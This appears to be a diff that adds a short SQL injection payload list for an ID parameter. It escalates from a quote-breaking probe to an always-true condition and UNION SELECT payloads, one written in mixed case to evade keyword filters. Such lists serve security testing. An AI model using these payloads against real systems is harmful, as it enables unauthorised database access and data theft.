@@ -1,0 +1,6 @@
+ID:1
+ID:1'
+ID:1"
+ID:1"||"1"="1
+ID:1" union select 1,2,3||"1"="1
+ID:1" uNIon sELect 1,2,3||"1"="1
